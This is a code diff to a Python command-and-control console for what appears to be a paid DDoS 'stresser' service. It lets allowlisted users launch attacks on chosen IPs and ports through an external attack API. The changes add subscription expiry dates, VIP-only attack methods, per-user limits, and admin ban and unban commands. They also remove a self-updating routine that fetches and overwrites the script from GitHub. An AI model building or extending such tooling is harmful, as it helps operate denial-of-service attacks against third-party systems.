@@ -11,7 +11,7 @@ import ipaddress
 import sys
 import subprocess
 
-__version__ = "1.0"
+__version__ = "1.1"
 
 LOG_FILE = "cnc_log.txt"
 CONFIG_FILE = "cnc_config.json"
@@ -32,11 +32,22 @@ config = load_config()
 API_URL = config['api_url']
 RAW_PORT = config['cnc_port']
 
-def is_ip_allowed(ip, allowed_ips):
-    return ip in allowed_ips
+def is_ip_allowed(ip, allowed_ips, banned_ips, allowed_ips_with_limits):
+    expiration_date_str = get_expiration_date(ip, allowed_ips_with_limits)
+    if expiration_date_str:
+        expiration_date = datetime.datetime.strptime(expiration_date_str, "%Y-%m-%d").date()
+        if datetime.date.today() > expiration_date:
+            return False
+    return ip in allowed_ips and ip not in banned_ips
+
+def is_ip_admin(ip, allowed_ips_with_limits):
+    for allowed_ip, ip_data in allowed_ips_with_limits.items():
+        if ip == allowed_ip:
+            return ip_data.get('admin_user', 'no') == 'yes'
+    return False
 
 def run_with_auto_update():
-    UPDATE_INTERVAL = 3000  # Check for updates every 60 seconds
+    UPDATE_INTERVAL = 60  # Check for updates every 60 seconds
     BACKUP_CONFIG_FILE = "cnc_config_backup.json"
 
     while True:
@@ -72,6 +83,12 @@ def get_attack_limit(ip, allowed_ips_with_limits):
             return ip_data['attack_limit']
     return None
 
+def is_user_vip(ip, allowed_ips_with_limits):
+    for allowed_ip, ip_data in allowed_ips_with_limits.items():
+        if ip == allowed_ip:
+            return ip_data.get('vip', False)
+    return False
+
 def get_threads_limit(ip, allowed_ips_with_limits):
     for allowed_ip, ip_data in allowed_ips_with_limits.items():
         if ip == allowed_ip:
@@ -82,6 +99,18 @@ def get_connection_limit(ip, allowed_ips_with_limits):
     for allowed_ip, ip_data in allowed_ips_with_limits.items():
         if ip == allowed_ip:
             return ip_data['connection_limit']
+    return None
+
+def get_nickname(ip, allowed_ips_with_limits):
+    for allowed_ip, ip_data in allowed_ips_with_limits.items():
+        if ip == allowed_ip:
+            return ip_data.get('nickname', 'User')
+    return "User"
+
+def get_expiration_date(ip, allowed_ips_with_limits):
+    for allowed_ip, ip_data in allowed_ips_with_limits.items():
+        if ip == allowed_ip:
+            return ip_data.get('expiration_date', None)
     return None
 
 def execute_attack(api_key, method, ip, port, time, threads):
@@ -106,11 +135,18 @@ def apply_config(conn, config):
     conn.send(f"\033[1;{config['text_color']}m".encode('utf-8'))  # Apply text color
     conn.send(f"\033[4{config['background_color']}m".encode('utf-8'))  # Apply background color
 
-def print_login_message(conn, methods, config):
-    apply_config(conn, config)
-    conn.send(f"Welcome! You are connected from an allowed IP address.\r\n".encode('utf-8'))
-    conn.send(f"Available methods: {', '.join(methods)}\r\n".encode('utf-8'))
-    conn.send(f"How to send: IP port time threads\r\n".encode('utf-8'))
+def print_login_message(conn, methods, config, nickname, addr, allowed_ips_with_limits):
+    conn.send(b"\033[2J\033[H")  # ANSI escape code to clear the screen
+    conn.send(f"\033[{config['text_color']};{config['background_color']}m".encode('utf-8'))  # Set text and background color
+    conn.send(b"Welcome to the CNC CLI\r\n")
+    conn.send(f"Hello, {nickname}\r\n".encode('utf-8'))
+    conn.send(b"Available methods:\r\n")
+    for method in methods:
+        conn.send(f"{method}\r\n".encode('utf-8'))
+    if is_user_vip(addr[0], allowed_ips_with_limits):
+        conn.send(b"VIP methods:\r\n")
+        for vip_method in config['vip_methods']:
+            conn.send(f"{vip_method}\r\n".encode('utf-8'))
 
 def is_valid_ipv4_address(ip):
     try:
@@ -139,12 +175,25 @@ def client_handler(conn, addr, connection_counter):
         api_key = config['api_key']
         methods = config['methods']
         allowed_ips_with_limits = config['allowed_ips']
+        admin_ips = [ip for ip in allowed_ips_with_limits.keys() if is_ip_admin(ip, allowed_ips_with_limits)]
 
-        if not is_ip_allowed(addr[0], allowed_ips_with_limits.keys()):
+        if addr[0] not in allowed_ips_with_limits.keys() and addr[0] not in admin_ips:
             print(f"Rejected connection from {addr[0]}:{addr[1]} (IP not allowed)")
             conn.send(b"Your IP address is not allowed to access this CNC CLI.\n")
             conn.close()
             log_activity(f"Failed login from {addr[0]}:{addr[1]} (IP not allowed)")
+            return
+        elif addr[0] in config['banned_ips']:
+            print(f"Rejected connection from {addr[0]}:{addr[1]} (IP banned)")
+            conn.send(b"Your IP address is banned from accessing this CNC CLI.\n")
+            conn.close()
+            log_activity(f"Failed login from {addr[0]}:{addr[1]} (IP banned)")
+            return
+        elif not is_ip_allowed(addr[0], allowed_ips_with_limits.keys(), config['banned_ips'], allowed_ips_with_limits):
+            print(f"Rejected connection from {addr[0]}:{addr[1]} (IP expired)")
+            conn.send(b"Your access to this CNC CLI has expired.\n")
+            conn.close()
+            log_activity(f"Failed login from {addr[0]}:{addr[1]} (IP expired)")
             return
 
         connection_limit = get_connection_limit(addr[0], allowed_ips_with_limits)
@@ -163,7 +212,8 @@ def client_handler(conn, addr, connection_counter):
 
         print(f"Accepted connection from {addr[0]}:{addr[1]}")
         log_activity(f"Successful login from {addr[0]}:{addr[1]}")
-        print_login_message(conn, methods, config)
+        nickname = get_nickname(addr[0], allowed_ips_with_limits)
+        print_login_message(conn, methods, config, nickname, addr, allowed_ips_with_limits)
 
         used_time = 0
         ongoing_attacks = 0
@@ -192,7 +242,7 @@ def client_handler(conn, addr, connection_counter):
                     break
                 elif command[0] == "clear":
                     conn.send(b"\033[2J\033[H")  # ANSI escape code to clear the screen
-                    print_login_message(conn, methods, config)
+                    print_login_message(conn, methods, config, nickname, addr, allowed_ips_with_limits)
                 elif command[0] == "config":
                     if len(command) == 3:
                         config_key = command[1]
@@ -250,7 +300,7 @@ def client_handler(conn, addr, connection_counter):
                         continue
 
                     response = execute_attack(api_key, method, ip, port, time, threads)
-                    if response ['success']:
+                    if response['success']:
                         ongoing_attacks += 1
                         used_time += int(time)
                         log_activity(f"User {addr[0]}:{addr[1]} started attack on {ip}:{port} for {time} seconds using method {method} and {threads} threads")
@@ -259,6 +309,35 @@ def client_handler(conn, addr, connection_counter):
                         ongoing_attacks -= 1
                     else:
                         conn.send(f"Error: {response['message']}\r\n".encode('utf-8'))
+                elif addr[0] in admin_ips and command[0] == "list":
+                    conn.send(b"List of allowed IPs and nicknames:\n")
+                    for allowed_ip, ip_data in allowed_ips_with_limits.items():
+                        conn.send(f"{allowed_ip} - {ip_data.get('nickname', 'User')}\r\n".encode('utf-8'))
+                elif addr[0] in admin_ips and command[0] == "ban":
+                    if len(command) == 2:
+                        ip_to_ban = command[1]
+                        if is_valid_ipv4_address(ip_to_ban):
+                            config['banned_ips'].append(ip_to_ban)
+                            save_config(config)
+                            conn.send(f"IP {ip_to_ban} has been banned.\r\n".encode('utf-8'))
+                            log_activity(f"Admin {addr[0]}:{addr[1]} banned IP: {ip_to_ban}")
+                        else:
+                            conn.send(b"Invalid IP address.\n")
+                    else:
+                        conn.send(b"Usage: ban <IP>\n")
+
+                elif addr[0] in admin_ips and command[0] == "unban":
+                    if len(command) == 2:
+                        ip_to_unban = command[1]
+                        if ip_to_unban in config['banned_ips']:
+                            config['banned_ips'].remove(ip_to_unban)
+                            save_config(config)
+                            conn.send(f"IP {ip_to_unban} has been unbanned.\r\n".encode('utf-8'))
+                            log_activity(f"Admin {addr[0]}:{addr[1]} unbanned IP: {ip_to_unban}")
+                        else:
+                            conn.send(b"IP not found in the banned list.\n")
+                    else:
+                        conn.send(b"Usage: unban <IP>\n")
                 else:
                     conn.send(b"Invalid command.\n")
             except Exception as e:
@@ -272,33 +351,6 @@ def client_handler(conn, addr, connection_counter):
         if addr[0] in connection_counter:
             connection_counter[addr[0]] -= 1
         conn.close()
-
-def check_for_updates():
-    github_url = "https://raw.githubusercontent.com/OVHGERMANY/PythonCNC/main/cnc_cli.py"
-    response = requests.get(github_url)
-    if response.status_code == 200:
-        remote_script = response.text
-        remote_version = None
-        for line in remote_script.splitlines():
-            if line.startswith("__version__"):
-                remote_version = line.split("=")[1].strip().strip('"')
-                break
-
-        if remote_version:
-            print(f"Local version: {__version__}, Remote version: {remote_version}")
-            if remote_version != __version__:
-                return True, remote_script
-            else:
-                print("No updates found.")
-        else:
-            print("Error: Unable to parse remote version.")
-    else:
-        print(f"Error: Unable to fetch remote script (status code: {response.status_code}).")
-    return False, None
-
-def update_script(new_script):
-    with open("cnc_cli.py", "w") as f:
-        f.write(new_script)
 
 def main():
     if len(sys.argv) > 1 and sys.argv[1] == "--auto-update":
